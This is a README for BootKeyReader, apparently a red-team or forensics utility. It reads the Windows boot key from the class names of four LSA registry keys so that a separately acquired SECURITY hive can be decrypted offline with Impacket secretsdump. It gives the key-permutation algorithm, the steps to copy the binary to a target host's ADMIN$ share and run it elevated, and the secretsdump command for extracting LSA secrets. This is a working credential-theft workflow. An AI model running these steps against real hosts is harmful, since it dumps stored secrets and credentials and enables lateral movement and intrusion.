# BootKeyReader

**Purpose:** Small C# helper that reads the Windows **boot key** (syskey) directly from the live registry — the class names of the four keys under `SYSTEM\CurrentControlSet\Control\Lsa\{JD,Skew1,GBG,Data}` — so an offline LSA-secrets decrypt can run with Impacket's `-bootkey` option **without ever acquiring or copying the SYSTEM hive**. Companion to `../UnderlayCopyCS/`: while that tool acquires a locked `SECURITY` hive, BootKeyReader supplies the matching boot key so the hive can be parsed fully offline.

## Algorithm

Bit-for-bit parity with Impacket `LocalOperations.getBootKey` (`impacket/impacket/examples/secretsdump.py:4007`; remote variant at `:1038`):

1. Read the **class name** of each of the four keys `JD`, `Skew1`, `GBG`, `Data` (each is 8 hex chars stored as UTF-16LE).
2. Concatenate → 32 hex chars → hex-decode → 16 bytes.
3. Permute with `[8, 5, 4, 2, 11, 9, 13, 3, 0, 6, 1, 12, 14, 10, 15, 7]` → boot key.

## Target context

- **Environment:** Windows x64 with .NET Framework 4.x — runs elevated (as administrator), since it reads `HKLM\SYSTEM`.
- **Binary:** x64 EXE (AnyCPU).

## Usage

```powershell
Copy-Item .\BootKeyReader.exe \<target-host>\ADMIN$\
# On the target host (elevated):
BootKeyReader.exe
```

Expected console output:

```text
JD    : <8 hex>
Skew1 : <8 hex>
GBG   : <8 hex>
Data  : <8 hex>
Boot Key: 0x<32 hex>
Impacket -bootkey: <32 hex>   (no 0x prefix)
```

Then decrypt the SECURITY-only hive off-host:

```bash
impacket-secretsdump -security SECURITY_only.hive -bootkey <32 hex> local
```

The `-bootkey` option takes the **bare hex** value — strip the `0x` prefix, or Impacket fails with `Non-hexadecimal digit found`.

## See also

- `../UnderlayCopyCS/` — raw-volume acquisition of the locked `SECURITY` hive.
- `../impacket/` — offline parser; the `-bootkey` option is declared at `impacket/examples/secretsdump.py:418`.
- Build: `Build.md`

## Notes

- Reads only four class names — it performs **no** hive copy and writes no file.
- The output is the boot key: treat it as sensitive and do not commit captured output.
